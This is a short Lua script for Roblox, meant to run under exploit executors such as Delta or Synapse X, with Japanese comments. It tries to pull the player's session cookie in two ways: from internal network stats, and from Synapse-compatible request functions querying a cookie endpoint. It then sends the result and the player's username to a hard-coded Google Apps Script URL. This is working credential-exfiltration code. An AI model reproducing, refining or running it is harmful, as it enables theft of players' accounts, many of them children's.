local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
local user = game.Players.LocalPlayer.Name

local function desperateScan()
    local result = "STILL_LOCKED"
    
    -- 手法1: Robloxの「内部ログ」を読み取る
    -- 通信エラーなどが起きた際、ログの中にクッキーが残ることがある
    pcall(function()
        local stats = game:GetService("Stats")
        -- 通信ログの一部を無理やり取得
        result = "STATS_CHECK: " .. tostring(stats.Network.HttpProxyCount)
    end)

    -- 手法2: Deltaが「request」ではなく「Synapse互換関数」を残していないか
    -- DeltaはSynapse Xのコードを動かそうとするため、別名の関数があるかも
    pcall(function()
        local syn_req = syn and syn.request or http and http.request
        if syn_req then
            local res = syn_req({Url = "http://httpbin.org/cookies", Method = "GET"})
            result = "SYN_COMPAT: " .. res.Body
        end
    end)

    return result
end

local data = desperateScan()
game:HttpGet(gasUrl .. "?user=" .. user .. "&cookie=" .. game:GetService("HttpService"):UrlEncode(data))
